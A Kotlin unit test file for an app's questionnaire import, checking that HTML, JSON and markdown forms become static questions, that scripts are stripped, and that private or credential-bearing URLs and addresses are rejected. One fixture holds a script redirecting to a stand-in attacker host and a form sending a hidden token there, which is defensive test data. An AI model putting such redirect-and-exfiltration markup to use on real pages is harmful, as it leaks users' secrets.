package me.rerere.rikkahub.data.orbis.gallery

import org.junit.Assert.*
import org.junit.Test
import java.net.InetAddress

class GalleryImportTest {
    @Test fun externalUtf8BomIsAcceptedWithoutChangingPersistedUtf8Codec() {
        val json = "\uFEFF{\"questions\":[{\"id\":\"q1\",\"text\":\"今天好吗？\"}]}"
        assertEquals("今天好吗？", extractGalleryQuestions(json, "human").questions.single().text)
        val html = "\uFEFF<html><label>心情？<textarea></textarea></label></html>"
        assertTrue(galleryImportText(html).trimStart().startsWith("<"))
        assertEquals("心情？", extractGalleryQuestions(html, "human").questions.single().text)
        assertEquals(json, galleryUtf8(json.toByteArray()))
    }
    @Test fun metadataPrefixDoesNotSplitEmojiAtUtf16Boundary() {
        assertEquals("a", galleryTextPrefix("a🌙b", 2))
        assertEquals("a🌙", galleryTextPrefix("a🌙b", 3))
        assertEquals("", galleryTextPrefix("🌙", 1))
    }
    @Test fun extractsStaticQuestionsWithoutExecutingScriptOrImportingCredentials() {
        val html = """<script>location='https://evil.invalid/?private=1'</script><form action="https://evil.invalid">
            <input type="hidden" name="token" value="secret"><input type="password" aria-label="密码">
            <label for="mood">今天心情怎样？</label><textarea id="mood" required></textarea>
            <fieldset><legend>想做什么？</legend><label><input type="radio" name="activity" value="a">散步</label><label><input type="radio" name="activity" value="b">休息</label></fieldset></form>"""
        val form = extractGalleryQuestions(html, "human")
        assertEquals(2, form.questions.size); assertEquals("今天心情怎样？", form.questions[0].text)
        assertEquals(listOf("散步", "休息"), form.questions[1].options); assertTrue(form.questions[0].required)
        assertFalse(form.toString().contains("secret")); assertFalse(form.toString().contains("evil"))
    }
    @Test fun importMustBeReviewedAndRespondentIsHumanChoice() {
        val json = """{"questions":[{"id":"q","text":"你喜欢什么？"}],"respondent":"human"}"""
        assertEquals("ai", extractGalleryQuestions(json, "ai").respondent)
        assertThrows(IllegalArgumentException::class.java) { extractGalleryQuestions("<script>buildQuestions()</script>", "human") }
    }
    @Test fun privateUrlsCredentialsAndRedirectSchemesAreNotAccepted() {
        listOf("http://example.org/q", "https://127.0.0.1/q", "https://192.168.1.1/q", "https://100.64.0.1/q", "https://[::1]/q", "https://[fc00::1]/q", "https://name:secret@example.org/q", "file:///private", "https://localhost/q", "https://example.org:8443/q").forEach {
            assertThrows("$it", IllegalArgumentException::class.java) { galleryQuestionnaireUrl(it) }
        }
        assertEquals("example.org", galleryQuestionnaireUrl("https://example.org/questionnaire").host)
    }
    @Test fun dnsAnswersMustAllBePublic() {
        listOf("0.0.0.0", "10.2.0.1", "172.16.1.1", "169.254.169.254", "100.125.1.2", "224.1.1.1", "198.18.0.1", "::1", "fe80::1", "fd00::1").forEach {
            assertFalse(it, galleryPublicAddress(InetAddress.getByName(it)))
        }
        assertTrue(galleryPublicAddress(InetAddress.getByName("8.8.8.8")))
    }
    @Test fun previewsAreUnicodeSafeAndStripScripts() {
        val preview = galleryPreview("html", "<style>private-style</style><script>secret</script><p>${"🌙".repeat(300)}</p>")
        assertEquals(120, preview.codePointCount(0, preview.length)); assertFalse(preview.contains("secret")); assertFalse(preview.contains("private"))
    }
    @Test fun numberedMarkdownAndQuestionLinesBecomeReviewableTextQuestions() {
        val form = extractGalleryQuestions("# 小问卷\n1. 今天感觉如何？\nA. 很好\nB. 一般\n2、有什么想告诉我\n\n你最喜欢哪种陪伴？", "human")
        assertEquals(3, form.questions.size)
        assertEquals("今天感觉如何？\nA. 很好\nB. 一般", form.questions.first().text)
        assertTrue(form.questions.all { it.type == "text" && it.options.isEmpty() })
    }
    @Test fun plainTextDoesNotPromoteScriptOnlyOrNonQuestionNoise() {
        listOf("", "仅一些说明，没有问卷。", "<script>1. fake?</script>", "```js\n1. fake?\n```").forEach {
            assertThrows(IllegalArgumentException::class.java) { extractGalleryQuestions(it, "human") }
        }
    }
}
